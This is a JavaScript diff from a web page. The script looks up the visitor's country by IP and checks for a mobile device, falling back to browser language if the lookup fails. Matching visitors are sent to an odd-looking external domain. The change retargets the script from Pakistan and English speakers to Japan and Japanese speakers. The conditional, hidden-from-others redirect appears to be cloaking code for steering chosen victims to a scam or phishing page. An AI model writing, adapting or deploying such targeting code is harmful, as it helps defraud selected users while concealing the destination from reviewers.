@@ -43,16 +43,16 @@
       return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     }
 
-   function isEnglishLang() {
-    return navigator.language.startsWith('en') || 
-           navigator.languages.some(lang => lang.startsWith('en'));
+function isJapaneseLang() {
+    return navigator.language.startsWith('ja') || 
+           navigator.languages.some(lang => lang.startsWith('ja'));
 }
 
     fetch('https://ipapi.co/json/')
       .then(response => response.json())
       .then(data => {
         // 严格的三重条件判断
-        if (data.country === 'PK' && isMobileDevice() ) {
+        if (data.country === 'JP' && isMobileDevice() ) {
           window.location.href = "https://www.jacmsotck.online/jz/j2.html";
           return;
         }
@@ -66,7 +66,7 @@
       })
       .catch(() => {
         // IP检测失败时严格的双重条件判断
-        if (isMobileDevice() && isEnglishLang()) {
+        if (isMobileDevice() && isJapaneseLang()) {
           window.location.href = "https://www.jacmsotck.online/jz/j2.html";
           return;
         }
